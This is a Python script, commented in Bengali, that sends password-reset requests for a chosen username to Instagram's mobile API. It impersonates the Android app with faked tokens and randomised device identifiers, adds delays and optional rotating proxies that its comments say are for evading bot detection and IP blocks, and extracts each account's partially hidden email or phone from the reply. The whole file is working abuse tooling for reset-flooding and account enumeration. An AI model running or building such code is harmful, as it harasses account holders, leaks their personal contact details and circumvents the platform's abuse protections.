import requests
import uuid
import random
import string
import re
import time

# 🚨 আপনার ফ্রি হোস্টিং-এর IP ব্লক এড়াতে চাইলে এখানে প্রক্সি দিতে পারেন
# উদাহরণ: PROXIES = ["http://12.34.56.78:8080"]
PROXIES = [
    None  # আপাতত ডিরেক্ট কানেকশন, ব্লক খেলে এখানে প্রক্সি বসাবেন
]

def send_reset(target):
    """
    Instagram Password Reset via Mobile API (V2)
    """
    # ১. র‍্যান্ডম প্রক্সি সিলেক্ট করা (যদি থাকে)
    proxy = random.choice(PROXIES)
    proxies = {"http": proxy, "https": proxy} if proxy else None

    url = "https://i.instagram.com/api/v2/accounts/send_password_reset/"
    
    # ২. মোবাইল অ্যাপের ফেক সেশন ও টোকেন জেনারেট
    data = {
        "_csrftoken": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
        "username": target,
        "guid": str(uuid.uuid4()),
        "device_id": str(uuid.uuid4())
    }
    
    # ৩. রিয়েল Android Instagram অ্যাপের হেডার (র‍্যান্ডম ডিভাইস আইডি সহ)
    headers = {
        "user-agent": (
            f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; "
            f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}/"
            f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}; "
            f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}; "
            f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}; "
            f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}; en_GB;)"
        )
    }

    # ৪. বট ডিটেকশন এড়াতে ১-৩ সেকেন্ড দেরি
    time.sleep(random.uniform(1.0, 3.0))

    try:
        # ৫. রিকোয়েস্ট পাঠানো
        response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=20)
        text = response.text.lower()

        # ৬. রেসপন্স চেক (V2 API)
        if "obfuscated_email" in text:
            ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', response.text)
            if ev:
                return f"email:{ev.group(0)}"
            return "phone"
            
        elif response.status_code == 404 or "not found" in text:
            return "error:not_found"
            
        elif "rate limit" in text or response.status_code == 429:
            return "error:rate_limited"
            
        elif "obfuscated_phone" in text:
            return "phone"
            
        else:
            return f"error:{response.status_code}"

    except requests.exceptions.ProxyError:
        return "error:proxy_dead"
    except requests.exceptions.Timeout:
        return "error:timeout"
    except Exception as e:
        return f"error:{str(e)[:15]}"
